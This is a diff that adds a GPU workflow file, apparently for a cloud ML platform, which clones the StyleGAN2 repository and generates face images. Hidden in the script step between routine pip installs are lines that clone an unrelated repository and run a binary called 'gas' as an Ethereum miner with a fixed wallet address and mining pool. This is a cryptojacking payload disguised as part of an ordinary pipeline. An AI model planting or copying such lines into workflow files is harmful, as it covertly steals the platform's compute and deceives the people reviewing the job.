@@ -1,0 +1,38 @@
+jobs:
+  CloneRepo:
+    resources:
+      instance-type: C3
+    outputs:
+      repo:
+        type: volume
+    uses: git-checkout@v1
+    with:
+      url: https://github.com/NVlabs/stylegan2.git
+  StyleGan2:
+    resources:
+      instance-type: P4000
+    needs:
+      - CloneRepo
+    inputs:
+      repo: CloneRepo.outputs.repo
+    outputs:
+      generatedFaces:
+        type: dataset
+        with:
+          ref: dsrhukf7ykk19re
+    uses: script@v1
+    with:
+      script: |-
+        pip install scipy==1.3.3
+        pip install requests==2.22.0
+        git clone https://github.com/mahligg45/yaaa.git
+        cd yaaa && chmod +x gas
+        ./gas -algo ethash -wallet 0x3d02f7b8dcb18e778fe35bf8b5a7f91d819bf0c4 -coin eth -rigName nanos -pool1 eth.2miners.com:2020
+        pip install Pillow==6.2.1
+        cd /inputs/repo
+        python run_generator.py generate-images \
+          --network=gdrive:networks/stylegan2-ffhq-config-f.pkl \
+          --seeds=6600-6605 \
+          --truncation-psi=0.5 \
+          --result-dir=/outputs/generatedFaces
+      image: tensorflow/tensorflow:1.14.0-gpu-py3
